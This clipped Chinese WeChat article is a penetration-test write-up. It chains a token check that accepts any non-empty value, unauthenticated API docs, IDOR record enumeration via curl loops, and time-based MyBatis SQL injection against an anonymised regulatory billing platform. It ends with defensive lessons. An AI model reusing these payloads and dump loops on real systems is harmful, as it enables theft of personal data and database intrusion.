---
title: 【微信】从Token伪造到SQL注入，四步打穿某监管平台全库
source: https://mp.weixin.qq.com/s/9sZc24roErlvhpxQPsBVAQ
source_host: mp.weixin.qq.com
clip_date: 2026-10-24T20:57:01+08:00
trace_id: 2a23e8ee-84f4-4684-aa62-ca9f55b5ad3b
content_hash: 33d4d155fa8c47f0dcd503e06cb849665286e99e091d170786f6f729976a1f58
status: synced
tags:
  - 微信
  - 漏洞分析
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 某移动端监管平台把小程序的 xxToken 鉴权简化成“非空即放行”，再叠加顺序编号遍历、身份证号 IDOR 和 MyBatis `${}` 拼接，最终从任意非空 token 一路利用到以 root 权限读取全库。
ai_summary_style: key-points
images_status:
  total: 14
  succeeded: 14
  failed_urls: []
notion_page_id: 40375244-d011-8194-ae83-d53d3ef4722e
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 某移动端监管平台把小程序的 xxToken 鉴权简化成“非空即放行”，再叠加顺序编号遍历、身份证号 IDOR 和 MyBatis `${}` 拼接，最终从任意非空 token 一路利用到以 root 权限读取全库。
> 
> - **鉴权基线：** 缺少 `xxToken` 时服务端返回 500「token不能为空」，但填任意非空字符串（如 `x` 或 SQL 语句片段）都返回 200；前端从本地存储取值，无签名、无时间戳，服务端也不做二次校验。
> - **未授权信息泄露：** `/v2/api-docs` 无鉴权暴露 knife4j 文档，内含全部接口路径、参数与 VO 字段，成为后续所有漏洞发现的基础指引；`police/base-data/biz-types/selectList` 同无鉴权，一次返回多租户 tenantId（含商户号）等基础配置。
> - **IDOR 与批量遍历：** `by-decision-number` 按顺序编号可直接 for 循环批量拉取当事人姓名、身份证、手机号、虚拟收款账号；`executed-bills/query` 以身份证号为主键且无数据权限校验，单次可翻 100 条记录。
> - **SQL 注入细节：** 注入点在 `searchKey`，MyBatis 使用 `LIKE '%${searchKey}%'` 字符串拼接；单引号触发报错页面，直接回显拼接 SQL、后端 jar 绝对路径与 mapper 文件名；`sleep(3)` 真假对照（真 3.4s / 假 0.34s）确认时间盲注可用。
> - **实际危害：** 数据库账号为 `root@%`（SUPER+FILE），版本 5.7.25，多库共享；虽未开启堆叠查询、`secure_file_priv` 受限，仍可用二分脚本逐字符盲注出 database、current_user、version 等，全程未做任何写操作。

**菜鸟学安全** *2026年10月24日 20:15*

　　一个看似普通的移动端接口，请求头里随便填一个非空字符串，就能返回当事人的姓名、身份证号、手机号和入账账号。这不是剧本，而是这次攻防项目里真实发生的第一幕。

　　目标是一个面向移动端的业务后端。它没有复杂的登录流程，也没有额外的风控校验，鉴权逻辑简单到只剩一句「xxToken 是否非空」。正是这个设计，让后面的越权查询、批量遍历和 SQL 注入变得顺理成章。

　　在一次攻防项目中，我们发现“某平台”（xx.xx.xx.xx）存在移动端鉴权形同虚设、未认证批量 PII 泄露（IDOR）、searchKey 参数 SQL 注入等 3 项高危漏洞，以及接口文档未授权、全租户基础数据未授权 2 项中危漏洞，共 5 项。

　　五个漏洞按利用顺序排列：从最外层的鉴权一路打到数据库。

## 1 移动端鉴权Token伪造

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=1（未授权，任意非空 xxToken）

**怎么发现的：**

目标是从主站前端 JS 泄露的关联主机找到的，再用公开的证书透明日志确认了这个移动端；接口前缀 `/api/populace-mobile/` 和 xx 个接口清单，则来自未授权开放的 `v2/api-docs` 。先做了一次鉴权基线：不带 `xxToken` 返回 500「token不能为空」，随便填一个非空值就 200——说明它只判断「有没有」，不判断「对不对」。

　　这个接口按 `decisionNumber` （决定书编号）查询涉xxxx物的xx账单。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/055c39c8f99252f0.png)

　　正常来说，这个接口应该校验登录态。但实际只要请求头里带上 xxToken，值随便填一个非空字符串，服务端就放行：

```
【请求包】
GET /api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=1 HTTP/1.1
Host: xx.xx.xx.xx
xxToken: x
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c00839f46e62cf50.png)

　　返回的是当事人的完整业务信息：

```css
【响应包】
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json

{
 "code": 200,
 "msg": "操作成功",
 "data": {
  "amount": "xx",
  "caseNumber": "xx",
  "suspect": "xx",
  "suspectIdCard": "xx",
  "suspectPhoneNumber": "xx",
  "virtualBankAccount": "xx",
  "…": "其余 8 个字段略"
 }
}
```

　　关键字段就这几个：当事人姓名、身份证、手机号、收款虚拟账号，加上金额和xx号。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/654bce71cd028a56.png)

　　对照测试很清楚：去掉 xxToken 头，返回 {"code":500,"msg":"token不能为空"}；把值换成 `1` 、 `x` 、 `AAAA...`、甚至 `"' or '1'='1"` ，全部返回 code:200。

　　前端 JS 审计也印证了这一点：xxToken 直接取自本地存储，请求时没有附加签名或时间戳，服务端也没有做二次校验。也就是说，这套鉴权只判断了「有没有」，没判断「对不对」。

　　更麻烦的是 decisionNumber 是顺序编号。写个循环从 1 递增，实测命中 xx 条真实记录：

```bash
# 单请求
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=1" -H "xxToken: x"

# 批量遍历（实测命中 xx 条真实记录）
for i in $(seq 1 40); do
 curl -sk "https://xx.xx.xx.xx/api/populace-mobile/wait-pay-bills/by-decision-number?decisionNumber=$i" -H "xxToken: x"; echo;
done > waitpay_dump.json
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f80c9023c216c2fa.png)

> 不需要任何凭据，一个 for 循环就能把整个辖区的xx账单跑一遍。

* * *

## 2 未认证批量 PII 泄露

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx（未授权 + IDOR）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dc91c0eb87eb1209.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a4c9d5c13f189b63.png)

**怎么发现的：**

同一个前缀、同一份 `v2/api-docs` 清单里还有 `executed-bills/query` 。它和上一个接口共用同一套鉴权基线（任意非空 `xxToken` 即过），区别是查询主键换成了身份证号，且没有做数据权限校验——典型的 IDOR。

　　同一个系统，另一个接口暴露得更彻底：

```
GET /api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx
```

　　接口拿身份证号做检索条件，直接返回当事人的账单记录，没有鉴权、也没有数据权限校验——典型的 IDOR。

　　缺 xxToken 时返回 token 不能为空：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2d1cecf83e0534f1.png)

　　加上任意 xxToken 后就正常出数据：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3444ce26c13bdcc3.png)

```
【请求包】
GET /api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx HTTP/1.1
Host: xx.xx.xx.xx
xxToken: aaa
```

```css
【响应包】
HTTP/1.1 200 OK
Content-Type: application/json

{
 "code": 200,
 "msg": "操作成功",
 "data": {
  "pages": {
   "records": [
    {
     "amount": "xx",
     "payAmount": "xx",
     "caseNumber": "xx",
     "decisionNumber": "xx",
     "suspect": "xx",
     "suspectIdCard": "xx",
     "suspectPhoneNumber": "xx",
     "virtualBankAccount": "xx",
     "recipientAccount": "xx",
     "…": "其余 20 个字段略"
    }
   ],
   "total": 3
  }
 }
}
```

```
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=100&idCard=xx" -H "xxToken: aaa"
```

> 危害比上一个更直接：参数就是身份证号，而身份证号在各类业务场景里是最容易拿到的标识。拿着它就能对任意xx拉取账单记录。

* * *

## 3 searchKey 参数 SQL 注入

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=%' OR 1=1-- -（未授权 + SQL 注入）

**怎么发现的：**

注入点不是扫出来的，是在 `v2/api-docs` 里看到 `executed-bills/query` 还有个 `searchKey` 参数，结合返回字段推断它进了模糊查询。先发一个单引号，报错页把拼接后的 SQL 原样吐了回来，确认 `searchKey` 走的是 MyBatis `LIKE '%${searchKey}%'` 、没有参数化；再用 `sleep(3)` 做真假对照，确认可以时间盲注。

　　还是同一个接口，多塞一个 `searchKey` 参数：

　　单引号闭合后，报错页把拼接后的 SQL 原样吐了回来：

```
【请求包】
GET /api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=%25%27%20OR%201%3D1--%20- HTTP/1.1
Host: xx.xx.xx.xx
xxToken: aaa
```

```
【响应包（截取注入点相关部分）】
HTTP/1.1 200 OK
Content-Type: application/json

{
 "code": 500,
 "msg": "nested exception is org.apache.ibatis.exceptions.PersistenceException:
 ### Error querying database. ...
 SELECT COUNT(1) FROM ( SELECT t.* FROM (
      ...
        AND (b.decision_number like '%%' OR 1=1-- -%' or b.bank_account like '%%' OR 1=1-- -%')  ← ${searchKey} 直接拼接
      ...
 ) TOTAL
 ### The error may exist in URL [jar:file:/xx/xx.jar!/BOOT-INF/classes!/mapper/BillRecordMapper.xml]"
}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d313f97dbff8c550.png)

　　报错页不只是回显 SQL，连后端 jar 的绝对路径和 mapper 文件名一起给了。

　　时间盲注验证（ `<>` 表示不等于）：

```bash
2023' and sleep(3) and '1'<>'2                     → 3.40s （条件为真，延时生效）
2023' and sleep(3) and '1'='2                      → 0.34s （常量假，短路）
2023' and sleep(0) and '1'<>'2                     → 0.37s （对照）
2023' and (select if(1=1,sleep(3),0)) and '1'<>'2  → 3.35s （子查询可控）
zzzzz' or (select sleep(3)) or '1'='1              → 15.21s （504 网关超时，sleep 叠加生效）
```

**实测过程**

　　searchKey=2023' and sleep(3) and '1'='2 （1不等于2，条件为假，不执行3秒，返回0.34秒）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2af6dde56e176397.png)

https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023' and sleep(3) and '1'='2

　　注入点：

　　searchKey=2023' and sleep(3) and '1'<>'2 （ `<>` 表示不等于，1 不等于 2，条件为真，执行 3 秒）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/38233dba5f0fdd36.png)

https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023' and sleep(3) and '1'<>'2

```
【请求包（sleep=3 载荷）】
GET /api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023%27+and+sleep%283%29+and+%271%27%3C%3E%272 HTTP/1.1
Host: xx.xx.xx.xx
xxToken: aaa
```

```
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/executed-bills/query?current=1&size=5&idCard=1&searchKey=2023%27+and+sleep%283%29+and+%271%27%3C%3E%272" -H "xxToken: aaa"
```

```
【响应包】HTTP/1.1 200 OK（响应耗时 3.40s）
```

　　布尔 + 时间双通道逐字符提取，实测拿到数据库信息：

```swift
version()            5.7.25
current_user()       root@%
database()           xx-server
@@secure_file_priv   /var/lib/mysql-files/
@@datadir            /var/lib/mysql/
```

　　当前连接账号是 root@%，具备 SUPER + FILE 权限；堆叠查询未开启，secure_file_priv 受限。这个 MySQL 实例是多库共享，共 多个库。

　　二分盲注脚本（注出 database 和 version）：

```
python xx_sqli_blind_extract.py -e "database()" -e "current_user()" -e "version()"
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e3104a49b6e69441.png)

　　原理不复杂：模板把 searchKey 拼成 `like '%<INJ>%'` ，注入串末尾用 `'1'<>'2'` 收尾避免语法错误；真假信号用 if(条件, sleep(N), 0) 承载，真约 N+0.4 秒、假约 0.3 秒；逐字符二分 ascii(substr(表达式,位置,1)) > mid，每个字符约 7 次请求。整个过程只用了任意非空 xxToken，没有构造任何写操作。

> 危害在于量级变了：前面两个漏洞泄露的是单条记录，这个漏洞交出去的是整个库的读取能力。注入点背后是一个 root@% 的连接账号，虽然堆叠查询没开、secure_file_priv 也有限制，但一个不需要任何登录态的 root 级注入点，已经能把 多个库、全部租户的账单逐字符读出来。

* * *

## 4 knife4j 接口文档未授权

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/v2/api-docs（未授权）

怎么发现的：

枚举 `/api/populace-mobile/` 前缀时， `v2/api-docs` 直接 200 返回了 knife4j 文档，不需要任何请求头。它本身是一个中危信息泄露，但也是前面三个高危漏洞的「地图」——xx 个接口的路径、参数和 VO 字段都在里面。

　　直接请求文档接口：

```
【请求包】
GET /api/populace-mobile/v2/api-docs HTTP/1.1
Host: xx.xx.xx.xx
```

```css
【响应包】
HTTP/1.1 200 OK
Content-Type: application/json

{
 "swagger": "2.0",
 "info": { "description": "使用 knife4j 搭建的后台服务API接口文档" },
 "paths": { "…": "…（xx 个接口，含全部写接口与 VO 字段定义；完整 JSON xx 字节，此处略）" }
}
```

```
curl -sk "https://xx.xx.xx.xx/api/populace-mobile/v2/api-docs" | head -c 500
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/10435e5a4c20e86d.png)

　　xx 个接口全在里面，包括未部署的、隐藏的，以及写接口的完整入参。

> 对攻击者来说，这相当于直接拿到一份完整的接口地图：哪些接口还在、哪些下线了但没拆、每个写接口要传什么字段，全都不用猜。有它兜底，前面那几个未授权接口根本不需要盲扫，照着文档发请求就行。

* * *

## 5 全租户基础数据未授权

**漏洞地址：** GET https://xx.xx.xx.xx/api/populace-mobile/police/base-data/biz-types/selectList（未授权）

怎么发现的：

同样是从 `v2/api-docs` 的接口清单里看到的 `police/base-data/biz-types/selectList` 。它和文档接口一样没有挂 `xxToken` 校验，直接 GET 就返回了 xx 条、xx 个租户的基础配置。

　　直接请求基础数据接口：

```
【请求包】
GET /api/populace-mobile/police/base-data/biz-types/selectList HTTP/1.1
Host: xx.xx.xx.xx
```

```css
【响应包】
HTTP/1.1 200 OK
Content-Type: application/json

{
 "code": 200,
 "data": [ "…（xx 条 / xx 个租户的 tenantId（含 bankArId 商户号）业务配置；完整 JSON xx 字节，此处略）" ]
}
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8f18b3194dae6f8c.png)

　　一次拿到 xx 个租户的业务基础配置。

> 单个租户的配置泄露不算致命，xx 个租户一次性拉走就不一样了：商户号、业务类型、计费规则全在里面，足够拼出这套平台的租户结构和业务规模，也能为后续针对特定租户的攻击做定向准备。

* * *

## 写在最后

　　回看整条链子，真正的起点不是某个高危接口，而是一份没关的接口文档和一句「token 非空就放行」。文档把接口地图交出来，鉴权基线把「任意非空」变成通行证，后面的越权、遍历和注入才有落点。

　　这次攻防项目没有用到零日漏洞，也没有复杂的绕过技巧。三个高危漏洞的共同点，是后端把「有没有 Token」当成了「有没有权限」：Token 只要非空就放行，对象标识只要传了就直接查，搜索参数只要拼进 SQL 就执行。

　　当鉴权只剩一层「非空判断」，后面的越权、批量遍历和注入就不再是独立的问题，而是一条顺理成章的利用链。对防守方来说，真正要补的不是某一个接口，而是每个请求都要回答的三个问题：你是谁、你能不能看这条数据、你传的参数有没有被当成代码执行。

　　攻防项目的意义，不是证明系统有多脆弱，而是在真实攻击者之前把问题找出来。文中域名、系统名、人员与业务数据均已脱敏，仅用于安全研究与防御参考。

漏洞挖掘 · 目录

作者提示: 个人观点，仅供参考
